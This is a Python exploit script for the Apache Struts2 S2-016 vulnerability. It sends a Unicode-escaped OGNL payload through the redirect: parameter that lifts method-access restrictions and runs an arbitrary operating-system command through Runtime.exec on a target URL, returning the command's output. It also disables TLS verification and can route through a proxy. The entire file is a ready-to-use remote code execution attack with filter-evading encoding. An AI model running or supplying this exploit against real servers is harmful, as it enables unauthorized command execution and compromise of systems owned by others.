import requests
from urllib3.exceptions import InsecureRequestWarning
import argparse

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def struts2_rce(url,command):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None

    # 将每个字符转为 Unicode 转义序列
    string = '#context["xwork.MethodAccessor.denyMethodExecution"]=false,#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec("' + command + '").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()'
    unicode_escape = ''.join([f"\\u{ord(char):04x}" for char in string])
    unicode_escape_bytes = unicode_escape.encode('utf-8')
    data = b'redir%65ct%3a%24{'+unicode_escape_bytes+b'}'
    response = requests.post(url, headers=headers, data=data, verify=False, proxies=proxies)
    print(response.text)

if __name__ == '__main__':
    args = argparse.ArgumentParser(description="S2-016_4-(unicode编码形式)漏洞利用 Author: pian-f")
    args.add_argument('-u','--url',dest="url",required=True,help="指定url")
    args.add_argument('-c','--command',dest="command",default="whoami",help="需要执行的系统命令(默认执行whoami)")
    args.add_argument('-p','--proxy',required=False,help='指定代理地址')
    args = args.parse_args()
    struts2_rce(args.url,args.command)